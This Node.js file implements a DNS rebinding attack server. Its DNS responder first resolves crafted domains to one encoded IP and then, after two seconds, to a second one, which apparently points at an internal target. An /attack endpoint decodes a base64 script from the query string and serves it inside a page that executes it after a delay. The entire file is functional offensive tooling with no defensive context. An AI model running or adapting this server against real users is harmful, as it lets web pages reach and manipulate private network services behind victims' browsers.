const http = require('http')
const httpPort = 5000

const express = require('express')
const app = express()
app.use(express.static('public'))

const dns = require('node-named')
const dnsPort = 53

const dnsServer = dns.createServer()

dnsServer.listen(dnsPort, '::ffff:0.0.0.0', ()=> {
  console.log(`DNS server is listening on ${dnsPort}`)
})

let cache = {}

dnsServer.on('query', query => {
  const domain = query.name()
  const type = query.type()

  const splits = domain.split('.')

  if(splits.length != 6)
    return

  if(!cache[domain]){
    cache[domain] = {
      timeStamp: Date.now()
    }
  }

  switch(type){
    case 'A':
      if(cache[domain].timeStamp > Date.now() - 2000){
        let record = new dns.ARecord(splits[1].replace(/-/g, '.'))
        query.addAnswer(domain, record, 0)
      }else{
        let record = new dns.ARecord(splits[2].replace(/-/g, '.'))
        query.addAnswer(domain, record, 0)
      }
      break;
      default:
        return
      break;
  }

  console.log('DNS Query: (%s) %s', type, domain)
  dnsServer.send(query)
})

app.get('/attack', (req, res) => {
  const script = new Buffer(req.query.script, 'base64').toString('ascii')
  res.end(`
    <html>
      <script>
        setTimeout(function(){
          ${script} 
        }, 3000)
      </script>
    </html>
  `)
})

app.listen(httpPort, () => {
  console.log(`HTTP server is listening on ${httpPort}`)
})
